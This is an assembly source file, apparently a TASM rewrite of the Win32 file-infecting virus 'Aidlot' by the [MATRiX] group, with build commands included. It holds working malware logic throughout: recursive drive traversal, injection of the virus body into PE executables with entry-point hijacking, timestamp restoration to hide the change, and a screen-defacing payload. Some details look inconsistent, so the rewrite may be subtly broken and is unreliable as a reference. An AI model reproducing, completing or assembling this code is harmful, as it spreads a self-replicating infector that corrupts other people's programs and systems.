; Virus.Win32.Aidlot rewritten for TASM 5
; Target: 32-bit Windows PE executable
; Assumes linking with import32.lib for Win32 API calls
; tasm32 /ml /m aidlot.asm
; tlink32 -Tpe -aa -c aidlot.obj,,,import32.lib


.386p
.MODEL FLAT, STDCALL
OPTION CASEMAP:NONE

; Include necessary Windows API definitions (you may need a custom include file)
INCLUDELIB import32.lib

; External Win32 API function declarations
EXTRN ExitProcess:PROC
EXTRN GlobalFindAtomA:PROC
EXTRN GetLastError:PROC
EXTRN GlobalAddAtomA:PROC
EXTRN CreateEventA:PROC
EXTRN CreateMutexA:PROC
EXTRN CreateMailslotA:PROC
EXTRN CreateThread:PROC
EXTRN Sleep:PROC
EXTRN CreateFileMappingA:PROC
EXTRN MapViewOfFile:PROC
EXTRN ReadFile:PROC
EXTRN SetEvent:PROC
EXTRN lstrcatA:PROC
EXTRN SetFileAttributesA:PROC
EXTRN CreateFileA:PROC
EXTRN UnmapViewOfFile:PROC
EXTRN CloseHandle:PROC
EXTRN SetFilePointer:PROC
EXTRN SetEndOfFile:PROC
EXTRN SetFileTime:PROC
EXTRN WaitForSingleObject:PROC
EXTRN FindFirstFileA:PROC
EXTRN FindNextFileA:PROC
EXTRN FindClose:PROC
EXTRN GetCurrentDirectoryA:PROC
EXTRN SetCurrentDirectoryA:PROC
EXTRN lstrcmpiA:PROC
EXTRN lstrlenA:PROC
EXTRN lstrcpyA:PROC
EXTRN WriteFile:PROC
EXTRN ReleaseMutex:PROC
EXTRN CreateDCA:PROC
EXTRN SetBkMode:PROC
EXTRN GetStockObject:PROC
EXTRN SelectObject:PROC
EXTRN TextOutA:PROC
EXTRN MessageBoxA:PROC
EXTRN GetSystemMetrics:PROC

; Segment definitions
CODE SEGMENT PARA PUBLIC 'CODE' USE32
ASSUME CS:CODE, DS:DATA, ES:NOTHING, SS:NOTHING, FS:NOTHING, GS:NOTHING

; Program entry point
PUBLIC start
start PROC NEAR
    ; Local variable
    var_4 EQU DWORD PTR [ESP-4]

    ; Check if already running using atom
    PUSH OFFSET String          ; ".aiD properlly running"
    CALL GlobalFindAtomA
    CALL GetLastError
    OR EAX, EAX
    JZ loc_401000               ; Exit if already running

    ; Add atom to mark as running
    PUSH OFFSET String          ; ".aiD properlly running"
    CALL GlobalAddAtomA

    ; Create event
    PUSH OFFSET Name            ; "e"
    PUSH 0                      ; bInitialState
    PUSH 0                      ; bManualReset
    PUSH 0                      ; lpEventAttributes
    CALL CreateEventA
    MOV DWORD PTR DS:[hEvent], EAX

    ; Create mutex
    PUSH OFFSET aAidSynchMutex  ; "aid synch mutex"
    PUSH 0                      ; bInitialOwner
    PUSH 0                      ; lpMutexAttributes
    CALL CreateMutexA
    MOV DWORD PTR DS:[hHandle], EAX

    ; Store argument (assuming ESP+0 is valid)
    MOV EAX, DWORD PTR [ESP+0]
    MOV DWORD PTR DS:[dword_402B14], EAX

    ; Create mailslot
    PUSH 0                      ; lpSecurityAttributes
    PUSH 0FFFFFFFFh             ; lReadTimeout
    PUSH 258h                   ; nMaxMessageSize
    PUSH OFFSET aMailslotAid    ; "\\\\.\\mailslot\\aiD"
    CALL CreateMailslotA
    MOV DWORD PTR DS:[hFile], EAX

    ; Create threads
    PUSH 3                      ; Number of threads
    MOV ESI, OFFSET off_40203B  ; Thread function table

loc_401073:
    PUSH OFFSET NumberOfBytesWritten ; lpThreadId
    PUSH 0                      ; dwCreationFlags
    PUSH 0                      ; lpParameter
    LODSD                       ; Load thread function address
    PUSH EAX                    ; lpStartAddress
    PUSH 0                      ; dwStackSize
    PUSH 0                      ; lpThreadAttributes
    CALL CreateThread
    DEC DWORD PTR [ESP+4+var_4]
    JNZ loc_401073

    ; Infinite sleep
    PUSH 0FFFFFFFFh             ; dwMilliseconds
    CALL Sleep

loc_401093:
    PUSH EAX                    ; dwNumberOfBytesToMap
    PUSH EBX                    ; lpName
    PUSH EAX                    ; dwMaximumSizeLow
    PUSH 0                      ; dwMaximumSizeHigh
    PUSH 4                      ; flProtect (PAGE_READWRITE)
    PUSH 0                      ; lpFileMappingAttributes
    PUSH ECX                    ; hFile
    CALL CreateFileMappingA
    PUSH 0                      ; dwFileOffsetLow
    PUSH 0                      ; dwFileOffsetHigh
    PUSH 2                      ; dwDesiredAccess (FILE_MAP_WRITE)
    PUSH EAX                    ; hFileMappingObject
    XCHG EAX, EDI
    CALL MapViewOfFile
    RETN
start ENDP

; Exit routine
loc_401000:
    PUSH 0                      ; uExitCode
    CALL ExitProcess

; Thread 1: File monitoring and infection
sub_4010B0 PROC NEAR
    MOV EBX, OFFSET aAidFm      ; "aiD-fm"
    MOV EAX, 4000h
    XOR ECX, ECX
    DEC ECX
    CALL loc_401093
    MOV DWORD PTR DS:[dword_4024B8], EAX

loc_4010C7:
    PUSH 0                      ; lpOverlapped
    PUSH OFFSET NumberOfBytesWritten ; lpNumberOfBytesRead
    PUSH 258h                   ; nNumberOfBytesToRead
    PUSH OFFSET unk_402250      ; lpBuffer
    PUSH DWORD PTR DS:[hFile]   ; hFile
    CALL ReadFile
    DEC DWORD PTR [ESP+0]
    PUSH OFFSET loc_4010C7
    JNZ loc_4010F8
    PUSH DWORD PTR DS:[hEvent]  ; hEvent
    CALL SetEvent

loc_4010F8:
    MOV EAX, OFFSET String2
    CMP DWORD PTR [EAX], 534F4847h ; "GHOST"
    JNZ locret_401192
    PUSH EAX                    ; lpString2
    PUSH OFFSET String1         ; lpString1
    CALL lstrcatA
    PUSH EAX
    PUSH 20h                    ; dwFileAttributes (hidden)
    PUSH EAX                    ; lpFileName
    CALL SetFileAttributesA
    POP EAX
    PUSH 0                      ; hTemplateFile
    PUSH 0                      ; dwFlagsAndAttributes
    PUSH 3                      ; dwCreationDisposition (OPEN_EXISTING)
    PUSH 0                      ; lpSecurityAttributes
    PUSH 1                      ; dwShareMode (FILE_SHARE_READ)
    PUSH 0C0000000h             ; dwDesiredAccess (GENERIC_READ | GENERIC_WRITE)
    PUSH EAX                    ; lpFileName
    CALL CreateFileA
    PUSH EAX                    ; hObject
    PUSH EAX
    PUSH EAX                    ; hFile
    PUSH EAX
    XCHG EAX, ECX
    MOV EAX, DWORD PTR DS:[dword_402270]
    MOV DWORD PTR DS:[lDistanceToMove], EAX
    ADD EAX, 4000h
    MOV EBX, OFFSET String2
    CALL loc_401093
    PUSH EDI                    ; hObject
    PUSH EAX                    ; lpBaseAddress
    CALL sub_40145E
    CALL UnmapViewOfFile
    CALL CloseHandle
    POP EBX
    PUSH 0                      ; dwMoveMethod (FILE_BEGIN)
    PUSH 0                      ; lpDistanceToMoveHigh
    PUSH DWORD PTR DS:[lDistanceToMove] ; lDistanceToMove
    PUSH EBX                    ; hFile
    CALL SetFilePointer
    CALL SetEndOfFile
    POP EBX
    MOV EAX, OFFSET LastWriteTime
    PUSH EAX                    ; lpLastWriteTime
    SUB EAX, 8
    PUSH EAX                    ; lpLastAccessTime
    SUB EAX, 8
    PUSH EAX                    ; lpCreationTime
    PUSH EBX                    ; hFile
    CALL SetFileTime
    CALL CloseHandle

locret_401192:
    RETN
sub_4010B0 ENDP

; Thread 2: Directory traversal
sub_401193 PROC NEAR
    PUSH DWORD PTR DS:[hEvent]  ; hHandle
    CALL WaitForSingleObject
    MOV DWORD PTR DS:[PathName], 5C3A43h ; "C:\"
    CALL sub_4011B4
    PUSH 0                      ; uExitCode
    CALL ExitProcess
sub_401193 ENDP

; Directory traversal subroutine
sub_4011B4 PROC NEAR
    ; Local variables
    var_8 EQU DWORD PTR [ESP-8]
    var_4 EQU DWORD PTR [ESP-4]

    PUSH 0

loc_4011B6:
    PUSH OFFSET Buffer          ; lpBuffer
    PUSH 104h                   ; nBufferLength
    CALL GetCurrentDirectoryA
    MOV EDI, OFFSET PathName
    PUSH EDI                    ; lpPathName

loc_4011CB:
    CALL SetCurrentDirectoryA
    OR EAX, EAX
    JZ loc_40132A
    PUSH OFFSET FindFileData    ; lpFindFileData
    PUSH OFFSET FileName        ; "*.*"
    CALL FindFirstFileA
    PUSH EAX

loc_4011E8:
    POP EBX
    MOV EAX, DWORD PTR [ESP+4+var_4]
    OR EAX, EAX
    JZ loc_401269
    PUSH EBX
    PUSH OFFSET byte_4024C0     ; lpString2
    PUSH OFFSET FindFileData.cFileName ; lpString1
    CALL lstrcmpiA
    OR EAX, EAX
    POP EBX
    JNZ loc_401208
    DEC DWORD PTR [ESP+4+var_4]

loc_401208:
    PUSH EBX                    ; hFindFile
    PUSH OFFSET FindFileData    ; lpFindFileData
    PUSH EBX                    ; hFindFile
    CALL FindNextFileA
    DEC EAX
    JZ loc_4011E8
    CALL FindClose
    DEC EAX
    CMP BYTE PTR DS:[PathName+3], 0
    JZ loc_40131F

loc_40122A:
    PUSH OFFSET asc_402069      ; ".."
    CALL SetCurrentDirectoryA
    INC DWORD PTR [ESP+4+var_4]
    MOV EDI, OFFSET PathName
    PUSH EDI
    PUSH EDI                    ; lpString
    CALL lstrlenA
    ADD EDI, EAX
    XCHG EAX, ECX
    DEC EDI
    STD
    XOR AL, AL
    STOSB
    MOV AL, 5Ch                 ; '\'
    REPNE SCASB
    INC EDI
    PUSH EDI
    INC EDI
    CLD
    PUSH EDI                    ; lpString2
    PUSH OFFSET byte_4024C0     ; lpString1
    CALL lstrcpyA
    POP EDI
    MOV WORD PTR [EDI], 5Ch     ; '\'
    JMP loc_4011CB

loc_401269:
    CMP DWORD PTR DS:[FindFileData.cFileName], 2Eh ; '.'
    JZ loc_401208
    MOV AL, BYTE PTR DS:[FindFileData.dwFileAttributes]
    AND AL, 10h                 ; Directory attribute
    CMP AL, 10h
    JNZ loc_4012A7
    PUSH EBX                    ; hFindFile
    CALL FindClose
    MOV EDI, OFFSET PathName
    PUSH EDI
    PUSH OFFSET FindFileData.cFileName ; lpString2
    PUSH EDI                    ; lpString1
    CALL lstrcatA
    PUSH EDI                    ; lpString
    CALL lstrlenA
    ADD EAX, DWORD PTR [ESP+8+var_8]
    MOV WORD PTR [EAX], 5Ch     ; '\'
    JMP loc_4011CB

loc_4012A7:
    PUSH EBX                    ; hFindFile
    CALL FindClose
    PUSH OFFSET FindFileData.cFileName ; lpString2
    PUSH OFFSET byte_4024C0     ; lpString1
    CALL lstrcpyA
    PUSH OFFSET Buffer          ; lpPathName
    CALL SetCurrentDirectoryA
    MOV DWORD PTR [ESP+4+var_4], EAX
    PUSH 0FFFFFFFFh             ; dwMilliseconds
    PUSH DWORD PTR DS:[hHandle] ; hHandle
    CALL WaitForSingleObject
    PUSH 0                      ; hTemplateFile
    PUSH 80h                    ; dwFlagsAndAttributes (FILE_ATTRIBUTE_NORMAL)
    PUSH 3                      ; dwCreationDisposition (OPEN_EXISTING)
    PUSH 0                      ; lpSecurityAttributes
    PUSH 1                      ; dwShareMode (FILE_SHARE_READ)
    PUSH 120116h                ; dwDesiredAccess
    PUSH OFFSET aMailslotAid    ; "\\\\.\\mailslot\\aiD"
    CALL CreateFileA
    PUSH EAX                    ; hObject
    PUSH 0                      ; lpOverlapped
    PUSH OFFSET NumberOfBytesWritten ; lpNumberOfBytesWritten
    PUSH 258h                   ; nNumberOfBytesToWrite
    PUSH OFFSET FindFileData    ; lpBuffer
    PUSH EAX                    ; hFile
    CALL WriteFile
    CALL CloseHandle
    PUSH DWORD PTR DS:[hHandle] ; hMutex
    CALL ReleaseMutex
    JMP loc_4011B6

loc_40131F:
    INC BYTE PTR DS:[PathName]
    JMP loc_4011B6

loc_40132A:
    CMP BYTE PTR DS:[PathName+3], 0
    JNZ loc_40122A
    POP EAX
    RETN
sub_4011B4 ENDP

; Thread 3: Display message
sub_401339 PROC NEAR
    ; Local variables
    x EQU DWORD PTR [ESP-10h]
    y EQU DWORD PTR [ESP-0Ch]

    PUSH 0AFC80h                ; dwMilliseconds
    CALL Sleep
    PUSH 0                      ; pdm
    PUSH 0                      ; pszPort
    PUSH 0                      ; pwszDevice
    PUSH OFFSET pwszDriver     ; "DISPLAY"
    CALL CreateDCA
    MOV DWORD PTR DS:[hdc], EAX
    PUSH 1                      ; mode (TRANSPARENT)
    PUSH EAX                    ; hdc
    CALL SetBkMode
    PUSH 10h                    ; i (DEFAULT_GUI_FONT)
    CALL GetStockObject
    PUSH EAX                    ; h
    PUSH DWORD PTR DS:[hdc]     ; hdc
    CALL SelectObject
    MOV DWORD PTR DS:[x], 10h
    MOV DWORD PTR DS:[y], 30h   ; '0'
    MOV ESI, OFFSET off_40207D  ; Message table

loc_40138C:
    LODSD
    OR EAX, EAX
    JZ loc_4013BA
    XCHG EAX, EDI
    PUSH EDI                    ; lpString
    CALL lstrlenA
    PUSH EAX                    ; c
    PUSH EDI                    ; lpString
    PUSH DWORD PTR DS:[y]       ; y
    PUSH DWORD PTR DS:[x]       ; x
    PUSH DWORD PTR DS:[hdc]     ; hdc
    CALL TextOutA
    ADD DWORD PTR DS:[y], 14h
    JMP loc_40138C

loc_4013BA:
    PUSH 0                      ; uType (MB_OK)
    PUSH OFFSET Caption         ; ".aid(s) by mort[MATRiX]"
    PUSH OFFSET Text            ; " click OK, and u'll b ok,..."
    PUSH 0                      ; hWnd
    CALL MessageBoxA
    PUSH 2                      ; mode (OPAQUE)
    PUSH DWORD PTR DS:[hdc]     ; hdc
    CALL SetBkMode
    PUSH 0                      ; nIndex (SM_CXSCREEN)
    CALL GetSystemMetrics
    MOV DWORD PTR DS:[x], EAX
    PUSH 1                      ; nIndex (SM_CYSCREEN)
    CALL GetSystemMetrics
    MOV DWORD PTR DS:[y], EAX

loc_4013F2:
    PUSH 8                      ; c
    PUSH OFFSET aMatrix         ; "[MATRiX]"
    PUSH 0
    PUSH 0
    PUSH DWORD PTR DS:[hdc]     ; hdc
    PUSH DWORD PTR DS:[x]
    CALL sub_401428
    MOV DWORD PTR [ESP+14h+y], EAX ; y
    PUSH DWORD PTR DS:[x]
    CALL sub_401428
    MOV DWORD PTR [ESP+14h+x], EAX ; x
    CALL TextOutA
    JMP loc_4013F2
sub_401339 ENDP

; Random coordinate generator
sub_401428 PROC NEAR
    ARG arg_0:DWORD

    MOV EAX, DWORD PTR DS:[dword_402B14]
    ROL EAX, 3
    XOR EAX, DWORD PTR DS:[dword_402B14]
    ADC DWORD PTR DS:[dword_402B14], EAX
    MOV EBX, EAX
    SBB EAX, DWORD PTR DS:[dword_402B14]
    AND EAX, 0FFFFFFFh

loc_401449:
    CMP EAX, arg_0
    JL locret_40145B
    SUB EAX, arg_0
    XOR DWORD PTR DS:[dword_402B14], EAX
    JMP loc_401449

locret_40145B:
    RETN 4
sub_401428 ENDP

; File infection subroutine
sub_40145E PROC NEAR
    ; Local variables
    var_10 EQU DWORD PTR [ESP-10h]
    var_C EQU DWORD PTR [ESP-0Ch]
    var_8 EQU DWORD PTR [ESP-8]
    var_4 EQU DWORD PTR [ESP-4]

    XCHG EAX, EBX
    MOVZX EAX, WORD PTR [EBX]
    NOT EAX
    CMP EAX, 0FFFFA5B2h         ; Check PE signature
    JNZ locret_401536
    MOV ESI, [EBX+3Ch]
    ADD ESI, EBX
    LODSD
    NOT EAX
    CMP EAX, 0FFFFBAAFh         ; Check optional header
    JNZ locret_401536
    PUSH DWORD PTR [ESI+28h]    ; AddressOfEntryPoint
    PUSH DWORD PTR [ESI+30h]    ; BaseOfData
    ADD DWORD PTR [ESI+4Ch], 1600h ; Increase SizeOfCode
    MOV EAX, [ESI+70h]
    SHL EAX, 3
    ADD EAX, ESI
    ADD EAX, 74h                ; Section table
    PUSH EAX
    XCHG EAX, ESI
    XCHG EAX, EDI

loc_40149D:
    LODSD
    ADD ESI, 24h
    OR EAX, EAX
    JNZ loc_40149D
    MOV EAX, [ESI-40h]          ; VirtualAddress
    ADD EAX, EBX
    ADD EAX, [ESI-3Ch]          ; PointerToRawData
    XCHG EAX, EDI
    PUSH EDI
    MOV EAX, DWORD PTR DS:[dword_4024B8]
    PUSH EAX
    MOV ECX, [EAX+4]
    ADD EAX, 10h
    XCHG EAX, ESI
    REP MOVSB
    XCHG EAX, ESI
    MOV EAX, [ESI-44h]          ; SizeOfRawData
    ADD EAX, [ESI-40h]          ; VirtualAddress
    POP EDI
    MOV ECX, EAX
    ADD EAX, [EDI]
    ADD EAX, DWORD PTR [ESP+10h+var_8]
    XCHG EAX, EDX
    MOV EAX, DWORD PTR [ESP+10h+var_10]
    ADD EAX, [EDI+8]
    MOV [EAX], EDX
    MOV EAX, DWORD PTR [ESP+10h+var_10]
    ADD EAX, [EDI+0Ch]
    MOV [EAX], EDX
    ADD DWORD PTR [ESI-48h], 2000h ; Increase VirtualSize
    ADD DWORD PTR [ESI-40h], 1600h ; Increase VirtualAddress
    OR DWORD PTR [ESI-2Ch], 0A0000020h ; Set section flags
    MOV ESI, DWORD PTR [ESP+10h+var_C]
    MOV EAX, [ESI+14h]
    MOV EDX, DWORD PTR [ESP+10h+var_4]
    SUB EDX, [ESI+0Ch]
    ADD EAX, EDX
    ADD EAX, EBX
    XCHG EAX, ESI
    MOV EDI, DWORD PTR [ESP+10h+var_10]
    ADD EDI, 0Bh
    PUSH ESI
    MOVSD
    MOVSB
    XCHG EAX, ESI
    MOV EAX, [ESI+0Ch]
    SUB ECX, EAX
    ADD EAX, DWORD PTR [ESP+14h+var_8]
    ADD EAX, EDX
    SUB EDI, 0Fh
    STOSD
    POP EDI
    MOV AL, 0E9h                ; JMP instruction
    STOSB
    XCHG EAX, ECX
    SUB EAX, 5
    STOSD
    ADD ESP, 10h
    ADD DWORD PTR DS:[lDistanceToMove], 1600h

locret_401536:
    RETN
sub_40145E ENDP

CODE ENDS

DATA SEGMENT PARA PUBLIC 'DATA' USE32
ASSUME CS:CODE, DS:DATA

; Data definitions
Caption         DB '.aid(s) by mort[MATRiX]', 0
aMailslotAid    DB '\\\\.\\mailslot\\aiD', 0
Name            DB 'e', 0
aAidSynchMutex  DB 'aid synch mutex', 0
off_40203B      DD OFFSET sub_4010B0, OFFSET sub_401193, OFFSET sub_401339
aAidFm          DB 'aiD-fm', 0
String          DB '.aiD properlly running', 0
FileName        DB '*.*', 0
asc_402069      DB '..', 0
pwszDriver      DB 'DISPLAY', 0
aMatrix         DB '[MATRiX]', 0
off_40207D      DD OFFSET aAidByMortMatri, OFFSET aFreewareVersio, OFFSET aCMatrixGroup20
                DD OFFSET aMatrixTeamUltr, OFFSET aGreetzMatrixTe, OFFSET aSpecialGreetzT
                DD OFFSET aSpecialBugWell, OFFSET aDedicatedMojiM, 0
aAidByMortMatri DB '.aiD by mort[MATRiX] running properly on system...', 0
aFreewareVersio DB ' freeware version - for educational purpose only', 0
aCMatrixGroup20 DB ' (c)[MATRiX] group 2000', 0
aMatrixTeamUltr DB ' [MATRiX] team: ULTRAS, Del_Armg0, NBK, Anaktos, Lord Dark, mort', 0
aGreetzMatrixTe DB ' greetz: [MATRiX] team, all ppl on undernet #virus chan', 0
aSpecialGreetzT DB ' special greetz to Anaktos, Darkman and Perikles', 0
aSpecialBugWell DB ' special bug: well, i dont think it', 27h, 'll run ever properlly,...:)', 0
aDedicatedMojiM DB ' ------[ dedicated moji marene ]-', 0
Text            DB ' click OK, and u', 27h, 'll b ok,...', 0

ALIGN 4
hFile           DD 0
ALIGN 16
unk_402250      DB 258h DUP(0)
LastWriteTime   DD 0, 0             ; FILETIME structure
ALIGN 16
dword_402270    DD 0
String2         DB 276 DUP(0)
String1         DB 280 DUP(0)
NumberOfBytesWritten DD 0
hEvent          DD 0
hHandle         DD 0
ALIGN 8
dword_4024B8    DD 0
lDistanceToMove DD 0
byte_4024C0     DB 520 DUP(0)
Buffer          DB 520 DUP(0)

; WIN32_FIND_DATAA structure (simplified)
FindFileData    DB 44 DUP(0)        ; dwFileAttributes, times, size, etc.
                DB 260 DUP(0)       ; cFileName (MAX_PATH)
                DB 14 DUP(0)        ; cAlternateFileName

PathName        DD 0
                DB 256 DUP(0)       ; Extended buffer for PathName
dword_402B14    DD 0
x               DD 0
y               DD 0
hdc             DD 0

DATA ENDS

END start
